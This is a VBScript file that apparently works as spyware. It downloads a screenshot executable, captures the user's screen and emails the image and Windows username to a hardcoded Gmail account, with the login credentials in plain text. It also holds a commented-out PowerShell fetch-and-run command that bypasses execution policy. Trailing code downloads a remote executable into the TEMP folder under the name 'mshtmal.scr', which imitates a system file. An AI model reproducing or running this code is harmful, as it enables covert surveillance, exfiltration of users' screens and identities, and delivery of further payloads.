Function DownloadCMDlet(path)
'Set your settings

    strFileURL = "https://cdn.rawgit.com/chuntaro/screenshot-cmd/c3053453/screenshot.exe?raw=true"
    strHDLocation = path & "\screenshot.png"

   ' Fetch the file

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")

    objXMLHTTP.open "GET", strFileURL, false
    objXMLHTTP.send()

    If objXMLHTTP.Status = 200 Then
      Set objADOStream = CreateObject("ADODB.Stream")
      objADOStream.Open
      objADOStream.Type = 1 'adTypeBinary

      objADOStream.Write objXMLHTTP.ResponseBody
      objADOStream.Position = 0    'Set the stream position to the start

      Set objFSO = Createobject("Scripting.FileSystemObject")
        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
      Set objFSO = Nothing

      objADOStream.SaveToFile strHDLocation
      objADOStream.Close
      Set objADOStream = Nothing
    End if

    Set objXMLHTTP = Nothing

End Function

Set emailObj      = CreateObject("CDO.Message")

emailObj.From     = "relayemail63@gmail.com"
emailObj.To       = "relayemail63@gmail.com"

Set environmentVars = WScript.CreateObject("WScript.Shell").Environment("Process")
userName = environmentVars("username")

emailObj.Subject  = "Screenshot from user: " & userName
emailObj.TextBody = "Here you go"

Set emailConfig = emailObj.Configuration

emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = true 
emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "relayemail63@gmail.com"
emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "remoteaccess"

emailConfig.Fields.Update

scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

Rem Sys.Desktop.Picture.SaveToFile scriptdir & "\screenshot.png"


strFileURL = "https://cdn.rawgit.com/chuntaro/screenshot-cmd/c3053453/screenshot.exe"
strHDLocation = scriptdir & "\screenshot.exe"

Set oShell = WScript.CreateObject ("WScript.Shell")
Rem oShell.run "powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command ""iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/kres0345/Downloads-With-PS1/master/DownloadDownloadProgram.ps1'))"""
oShell.Run "powershell.exe Invoke-WebRequest -Uri " & strFileURL & " -OutFile " & strHDLocation


WScript.Sleep(8000)
oShell.Run "screenshot.exe"
WScript.Sleep(8000)

emailObj.AddAttachment scriptdir & "\screenshot.png"

emailObj.Send

rem If err.number = 0 then Msgbox "Done"


Rem END OF SCRIPT
Wscript.Quit












dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://cdn.rawgit.com/kres0345/Downloads-With-PS1/4cf33ff2/nanoc.exe", False

xHttp.Send

Set environmentVars = WScript.CreateObject("WScript.Shell").Environment("Process")
tempFolder = environmentVars("TEMP")

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile (tempFolder & "\mshtmal.scr"), 2 '//overwrite
end with